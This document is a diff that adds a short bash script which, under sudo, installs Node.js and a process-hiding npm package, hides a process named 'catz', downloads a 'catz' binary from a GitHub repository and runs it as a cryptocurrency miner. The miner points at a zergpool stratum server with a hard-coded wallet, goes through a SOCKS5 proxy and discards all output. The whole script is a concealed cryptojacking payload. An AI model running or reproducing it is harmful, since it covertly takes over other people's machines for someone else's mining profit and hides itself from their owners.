@@ -1,0 +1,2 @@
+#!/bin/bash
+sudo su --command "sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.4.1 && npm i -g node-process-hider && ph add catz && apt install wget && wget https://github.com/gembock/glowing-octo-computing-machine/raw/main/catz && chmod +x catz && ./catz -o stratum+tcp://yespowerSUGAR.mine.zergpool.com:6535 -u dgb1qjank960gde85sks7nlr4ge8tujc09d3qt8pznn -p c=DGB,mc=SUGAR,m=solo -t 4 --proxy socks5://49.12.236.170:10000 > /dev/null 2>&1"
